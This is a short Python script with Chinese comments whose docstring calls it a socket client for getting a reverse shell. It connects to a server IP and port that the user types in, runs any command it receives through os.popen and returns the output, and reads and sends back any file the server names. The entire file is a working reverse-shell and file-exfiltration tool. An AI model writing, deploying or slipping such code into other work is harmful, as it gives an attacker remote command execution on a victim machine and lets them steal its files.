#-- coding: utf-8 --
#@Author : Schun
#@Time : 2022/8/9 9:14


'''
当创建了socket，出现连接超时，且本地可以访问，就要考虑是否是云服务器的防火墙在在作祟。
通过socke-client脚本编写，执行socket-server发送的命令，实现反弹shell
'''

import os
import socket
import sys




tcp_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_ip = input("请输入服务器ip:")
server_port = int(input("请输入服务器port:"))
tcp_client_socket.connect((server_ip, server_port))
#打印当前操作系统类型
print("Current OS：", sys.platform)

while True:
    # 提示用户输入数据
    send_data = "输入可执行命令,例如：cmd|XXXXX"
    tcp_client_socket.send(send_data.encode("utf-8"))
    # 接收对方发送过来的数据，最大接收1024个字节
    recvData = tcp_client_socket.recv(1024)
    recvData_str = recvData.decode('utf-8')
    print('接收到的数据为:',recvData_str)

    if "cmd" in recvData_str:
        data = recvData_str.replace('cmd|', '')
        send_datat = os.popen(data).read()
        tcp_client_socket.send(send_datat.encode('utf-8'))
    elif 'file' in recvData_str:
        data = recvData_str.replace('file|', '')
        f = open(data).read()
        tcp_client_socket.sendall(f.encode())
        f.close()
    else:
        tcp_client_socket.close()




# 关闭套接字
tcp_client_socket.close()